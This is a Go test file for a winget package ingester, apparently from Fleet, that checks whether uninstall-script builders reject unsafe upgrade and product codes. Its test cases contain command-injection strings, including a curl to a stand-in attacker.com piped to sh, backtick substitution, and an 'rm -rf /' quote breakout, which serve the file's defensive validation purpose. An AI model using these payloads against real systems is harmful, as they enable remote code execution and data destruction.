package winget

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path"
	"testing"

	"github.com/fleetdm/fleet/v4/server/ptr"
	"github.com/google/go-github/v37/github"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"gopkg.in/yaml.v2"
)

func TestBuildUpgradeCodeBasedUninstallScript(t *testing.T) {
	tests := []struct {
		name        string
		upgradeCode string
		wantErr     bool
		errContains string
	}{
		{
			name:        "valid GUID upgrade code",
			upgradeCode: "{12345678-1234-1234-1234-123456789012}",
			wantErr:     false,
		},
		{
			name:        "valid simple upgrade code",
			upgradeCode: "SomeUpgradeCode-1.0",
			wantErr:     false,
		},
		{
			name:        "malicious upgrade code with command substitution",
			upgradeCode: "legit$(curl attacker.com/s|sh)",
			wantErr:     true,
			errContains: "contains invalid characters",
		},
		{
			name:        "malicious upgrade code with backticks",
			upgradeCode: "legit`curl attacker.com`",
			wantErr:     true,
			errContains: "contains invalid characters",
		},
		{
			name:        "malicious upgrade code with single quote breakout",
			upgradeCode: "code'; rm -rf /; echo '",
			wantErr:     true,
			errContains: "contains invalid characters",
		},
		{
			name:        "malicious upgrade code with semicolon",
			upgradeCode: "code;whoami",
			wantErr:     true,
			errContains: "contains invalid characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := buildUpgradeCodeBasedUninstallScript(tt.upgradeCode)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errContains)
				assert.Empty(t, result)
			} else {
				require.NoError(t, err)
				assert.NotEmpty(t, result)
				// Verify the upgrade code appears in single quotes
				assert.Contains(t, result, "'"+tt.upgradeCode+"'")
			}
		})
	}
}

func TestPreProcessUninstallScript(t *testing.T) {
	tests := []struct {
		name            string
		uninstallScript string
		productCode     string
		wantErr         bool
		errContains     string
	}{
		{
			name:            "valid GUID product code",
			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
			productCode:     "{12345678-1234-1234-1234-123456789012}",
			wantErr:         false,
		},
		{
			name:            "valid simple product code",
			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
			productCode:     "SomeProduct-1.0",
			wantErr:         false,
		},
		{
			name:            "malicious product code with command substitution",
			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
			productCode:     "legit$(curl attacker.com/s|sh)",
			wantErr:         true,
			errContains:     "contains invalid characters",
		},
		{
			name:            "malicious product code with backticks",
			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
			productCode:     "legit`curl attacker.com`",
			wantErr:         true,
			errContains:     "contains invalid characters",
		},
		{
			name:            "malicious product code with single quote breakout",
			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
			productCode:     "code'; rm -rf /; echo '",
			wantErr:         true,
			errContains:     "contains invalid characters",
		},
		{
			name:            "malicious product code with pipe",
			uninstallScript: `msiexec /x "$PACKAGE_ID" /quiet`,
			productCode:     "code|whoami",
			wantErr:         true,
			errContains:     "contains invalid characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := preProcessUninstallScript(tt.uninstallScript, tt.productCode)
			if tt.wantErr {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tt.errContains)
				assert.Empty(t, result)
			} else {
				require.NoError(t, err)
				assert.NotEmpty(t, result)
				// Verify the product code appears in single quotes
				assert.Contains(t, result, "'"+tt.productCode+"'")
			}
		})
	}
}

func TestIngestValidations(t *testing.T) {

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		path := path.Base(r.URL.Path)
		fmt.Println(path)
		fmt.Println(r.URL.Path)
		fmt.Println("--------------------__---_--------")

		switch r.URL.Path {
		// TODO: use strings.HasSuffix or some other more flexible way
		case "/repos/microsoft/winget-pkgs/contents/manifests/g/guh":
			content := []github.RepositoryContent{{Name: ptr.String("guh")}} // use new() ?
			err := json.NewEncoder(w).Encode(content)
			require.NoError(t, err)

		case "/repos/microsoft/winget-pkgs/contents/manifests/g/guh/guh/guh.installer.yaml":
			manifest := installerManifest{
				ProductCode:            "um",
				InstallerType:          "um",
				Scope:                  "um",
				AppsAndFeaturesEntries: []appsAndFeaturesEntries{},
				PackageVersion:         "um",
				Installers: []installer{
					{
						Architecture:           "um",
						InstallerType:          "um",
						Scope:                  "um",
						InstallerURL:           "um",
						InstallerSha256:        "um",
						InstallModes:           []string{},
						InstallerSwitches:      installerSwitches{},
						ProductCode:            "um",
						AppsAndFeaturesEntries: []appsAndFeaturesEntries{},
						InstallerLocale:        "um",
					},
				},
			}
			bytes, err := yaml.Marshal(manifest)
			require.NoError(t, err)
			stringManifest := string(bytes)

			content := &github.RepositoryContent{Name: ptr.String("guh"), Content: &stringManifest}
			err = json.NewEncoder(w).Encode(content)
			require.NoError(t, err)

		case "/repos/microsoft/winget-pkgs/contents/manifests/g/guh/guh/guh.locale.en-US.yaml":
			lManifest := localeManifest{
				PackageName: "umm",
				Publisher:   "um, Inc.",
			}
			bytes, err := yaml.Marshal(lManifest)
			require.NoError(t, err)
			stringManifest := string(bytes)

			content := &github.RepositoryContent{Name: ptr.String("guh"), Content: &stringManifest}
			err = json.NewEncoder(w).Encode(content)
			require.NoError(t, err)
		default:
			w.WriteHeader(http.StatusBadRequest)
			t.Fatalf("unexpected name %s", path)
		}

		err := json.NewEncoder(w).Encode("")
		require.NoError(t, err)
	}))
	t.Cleanup(srv.Close)

	uhhtest := srv.Client()
	fmt.Println(uhhtest)

	ctx := context.Background()

	tempDir := t.TempDir()

	testInstallScriptContents := "this is a test install script"
	require.NoError(t, os.WriteFile(path.Join(tempDir, "install_script.ps1"), []byte(testInstallScriptContents), 0644))

	testUninstallScriptContents := "this is a test uninstall script"
	require.NoError(t, os.WriteFile(path.Join(tempDir, "uninstall_script.ps1"), []byte(testUninstallScriptContents), 0644))

	cases := []struct {
		wantErr  string
		inputApp inputApp
	}{
		{"", inputApp{
			Name:                "guh",
			UniqueIdentifier:    "guh",
			PackageIdentifier:   "guh",
			InstallerArch:       "um",
			Slug:                "um",
			InstallScriptPath:   path.Join(tempDir, "install_script.ps1"),
			UninstallScriptPath: path.Join(tempDir, "uninstall_script.ps1"),
			InstallerType:       "um",
			InstallerScope:      "um",
			InstallerLocale:     "um",
			ProgramPublisher:    "um",
			UninstallType:       "um",
			FuzzyMatchName:      false,
			IgnoreHash:          false,
			DefaultCategories:   []string{},
			Frozen:              false,
			PatchPolicyPath:     "",
		}},
	}
	for _, c := range cases {
		t.Run(c.inputApp.Name, func(t *testing.T) {
			gc := github.NewClient(srv.Client())
			url, err := url.Parse(srv.URL + "/")
			gc.BaseURL = url
			require.NoError(t, err)
			i := wingetIngester{
				logger:       slog.New(slog.DiscardHandler),
				githubClient: gc,
			}

			out, err := i.ingestOne(ctx, c.inputApp)
			if c.wantErr != "" {
				require.ErrorContains(t, err, c.wantErr)
				return
			}
			require.NoError(t, err)
			fmt.Println(out)

		})
	}
}
